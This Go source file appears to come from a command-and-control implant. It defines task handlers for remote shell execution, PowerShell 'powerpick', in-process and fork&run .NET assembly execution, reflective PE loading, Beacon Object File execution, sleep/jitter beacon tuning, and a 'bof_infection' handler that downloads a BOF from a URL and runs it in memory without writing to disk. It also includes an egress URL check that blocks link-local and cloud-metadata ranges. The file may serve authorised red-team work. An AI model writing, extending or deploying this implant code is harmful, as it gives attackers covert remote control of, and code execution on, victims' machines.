//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func handleShell(task Task, res *TaskResult) {
	// Streaming: deltas become Partial results after the 3 s first-flush gate
	// inside runShellStreaming; fast commands never emit a single partial.
	// Partial shipping stops after maxOutputSize cumulative bytes — the final
	// result is capped by streamBuf anyway, and unbounded partials would just
	// pile up in the pending queue for a firehose command.
	var partialBytes int
	var partialCut bool
	out, err := runShellStreaming(task.Command, task.Shell, func(delta string) {
		if partialCut {
			return
		}
		partialBytes += len(delta)
		if partialBytes > maxOutputSize {
			partialCut = true
			return
		}
		enqueuePartialResult(task, delta)
	})
	if err != nil {
		res.Error = err.Error()
	}
	if out != "" {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handlePS(task Task, res *TaskResult) {
	out, err := getProcessList()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleProcessTree(task Task, res *TaskResult) {
	out, err := getProcessTree()
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}

func handlePowerPick(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "powerpick is Windows-only"
		return
	}
	done := make(chan string, 1)
	go func() {
		done <- powerPick(task.Command)
	}()
	select {
	case out := <-done:
		if strings.HasPrefix(out, "failed") || strings.Contains(out, "[!] powerpick error:") {
			res.Error = out
		} else {
			res.Output = out
		}
	case <-time.After(30 * time.Second):
		res.Error = "powerpick execution timed out (30s)"
	}
}

func handleExecuteAssembly(task Task, res *TaskResult) {
	out, err := executeAssembly(task.Data)
	if err != nil {
		res.Error = err.Error()
	} else {
		decoded, _ := base64.StdEncoding.DecodeString(out)
		if decoded != nil {
			res.Output = string(decoded)
		} else {
			res.Output = out
		}
	}
}

func handleExecuteAssemblyForkRun(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "execute-assembly fork&run is Windows-only"
		return
	}
	out, err := executeAssemblyForkRun(task.Data)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handlePELoader(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "peloader is Windows-only"
		return
	}
	out, err := peloaderReflective(task.Data)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleBOF(task Task, res *TaskResult) {
	bofData, err := base64.StdEncoding.DecodeString(task.Data)
	if err != nil {
		res.Error = fmt.Sprintf("bof: base64 decode failed: %v", err)
	} else if runtime.GOOS != "windows" {
		res.Error = "bof: Windows-only"
	} else {
		out, err := executeBOF(bofData, task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}
	}
}

func handleDownloadURL(task Task, res *TaskResult) {
	url := task.Command
	dest := task.Path
	if dest == "" {
		dest = task.Shell
	}
	if err := downloadFromURL(url, dest); err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "Downloaded to " + dest
		res.Path = dest
	}
}

func handleSetSleep(task Task, res *TaskResult) {
	parts := strings.Split(task.Command, ",")
	i, err := strconv.Atoi(strings.TrimSpace(parts[0]))
	if err != nil || i <= 0 {
		res.Error = "sleep interval must be a positive integer (seconds)"
		return
	}
	IntervalStr = strconv.Itoa(i)
	if len(parts) >= 2 {
		if j, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
			JitterStr = strconv.Itoa(j)
		}
	}
	// Re-derive the typed globals from the canonical string config so the new
	// sleep/jitter actually take effect and survive a later reparse (which
	// rebuilds Interval/Jitter from *Str).
	reparseNetworkConfig()
	res.Output = fmt.Sprintf("sleep set to %s s, jitter %s%%", IntervalStr, JitterStr)
}

// handleBOFInfection downloads a BOF .o file from the given URL and executes
// it in-memory (never touches disk).
func handleBOFInfection(task Task, res *TaskResult) {
	url := task.Command
	if url == "" {
		res.Error = "bof_infection: no URL provided"
		return
	}

	data, err := downloadBytes(url)
	if err != nil {
		res.Error = fmt.Sprintf("bof_infection: download failed: %v", err)
		return
	}

	// task.Shell holds the BOF arguments
	out, err := executeBOF(data, task.Shell)
	if err != nil {
		res.Error = fmt.Sprintf("bof_infection: %v", err)
	} else {
		res.Output = out
	}
}

// validateEgressURL gates operator-supplied download URLs against SSRF into
// cloud metadata and link-local targets. Denied: non-http(s) schemes,
// unresolvable hosts (fail closed), and hosts resolving into link-local or
// ULA ranges (169.254.0.0/16 incl. v4-mapped, fe80::/10, fd00::/8).
// Loopback stays allowed (local staging servers are a legitimate pattern);
// cloud-credential tasks fetch metadata through their own code paths, never
// these helpers. NOTE: resolve-then-connect has an inherent DNS-rebinding
// TOCTOU; this raises the bar, it does not close it.
func validateEgressURL(urlStr string) error {
	u, err := url.Parse(urlStr)
	if err != nil {
		return fmt.Errorf("invalid download URL: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("download URL scheme must be http(s), got %q", u.Scheme)
	}
	host := u.Hostname()
	if host == "" {
		return fmt.Errorf("download URL has no host")
	}
	var ip net.IP
	if parsed := net.ParseIP(host); parsed != nil {
		ip = parsed
	} else {
		addrs, err := net.LookupIP(host)
		if err != nil || len(addrs) == 0 {
			return fmt.Errorf("download host does not resolve: %s", host)
		}
		ip = addrs[0]
	}
	if isEgressDeniedIP(ip) {
		return fmt.Errorf("download target %s resolves to a denied range (link-local/ULA)", host)
	}
	return nil
}

func isEgressDeniedIP(ip net.IP) bool {
	if ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() || ip.IsMulticast() {
		return true
	}
	if ip4 := ip.To4(); ip4 != nil {
		// 169.254.0.0/16 (cloud metadata lives at 169.254.169.254).
		if ip4[0] == 169 && ip4[1] == 254 {
			return true
		}
		return false
	}
	// IPv6 ULA fd00::/8.
	if len(ip) == net.IPv6len && ip[0] == 0xfd {
		return true
	}
	return false
}

// downloadBytes fetches raw bytes from an HTTP(S) URL into memory.
func downloadBytes(urlStr string) ([]byte, error) {
	if err := validateEgressURL(urlStr); err != nil {
		return nil, err
	}
	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", getActiveUserAgentFromConfig())

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	return io.ReadAll(io.LimitReader(resp.Body, 16*1024*1024))
}
